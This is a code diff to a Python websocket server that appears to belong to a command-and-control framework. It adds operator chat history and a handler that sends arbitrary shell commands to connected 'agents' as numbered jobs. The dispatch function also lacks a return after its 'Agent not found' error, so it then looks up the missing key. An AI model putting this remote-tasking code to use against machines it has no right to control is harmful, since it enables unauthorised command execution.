@@ -1,5 +1,5 @@
 from lib import logger
-from lib.vglobals.sharedvars import clients_session, clients_wsocket, jobs
+from lib.vglobals.sharedvars import clients_session, clients_wsocket, agents, jobs
 from lib.response import wresponse
 
 from websockets import server
@@ -10,9 +10,9 @@ import json
 import ssl as _ssl
 
 tasks = set()
+chat_messages: list[dict] = []
 
-
-def get_client_from_id(client_id: str):
+def get_client_usrname_from_id(client_id: str) -> str:
     return list(clients_session.keys())[list(clients_session.values()).index(client_id)]
 
 
@@ -27,9 +27,23 @@ async def remove_client(websocket: server.WebSocketServerProtocol):
 
 
 async def broadcast_chat(msg: str, color_code: int, username: str):
+    chat_messages.append({"username": username, "color": color_code, "message": msg})
     for connection in clients_wsocket:
         await connection.send(wresponse({"username": username, "color": color_code, "message": msg}, "chat", 0))
-        
+
+async def send_command_to_agent(websocket: server.WebSocketServerProtocol, cmd_exec: str, target_id: str):
+    if not target_id in list(agents.keys()):
+        await websocket.send(wresponse("Agent not found", "error", 500))
+    
+    agent = agents[target_id]
+
+    job_n = len(jobs.keys()) + 1
+
+    agent.send(json.dumps({"exec": cmd_exec, "job": job_n}).encode())
+
+    jobs[job_n] = None
+
+    await websocket.send(wresponse({"job": job_n}, "send_command"))
 
 async def handle_messages(websocket: server.WebSocketServerProtocol):
     async for message in websocket:
@@ -46,10 +60,13 @@ async def handle_messages(websocket: server.WebSocketServerProtocol):
 
         match mtype:
             case "chat":
-                await broadcast_chat(message["msg"],message["color"], get_client_from_id(session))
+                await broadcast_chat(message["msg"],message["color"], get_client_usrname_from_id(session))
 
-            case _:
-                ...
+            case "sync":
+                await websocket.send(wresponse({"messages": chat_messages}, "sync"))
+
+            case "send_command":
+                await send_command_to_agent(websocket, message["exec"], message["target"])
 
 async def whandler(websocket: server.WebSocketServerProtocol):
     clients_wsocket.append(websocket)
@@ -65,7 +82,7 @@ async def whandler(websocket: server.WebSocketServerProtocol):
         await websocket.send(wresponse("invalid format, you need to JSON", "error", 405))
 
     except wsExceptions.ConnectionClosedError:
-        ...
+        pass
 
 async def _run(ip: str, port: int, ssl=False, ssl_context=()):
     ws_ssl_context = None
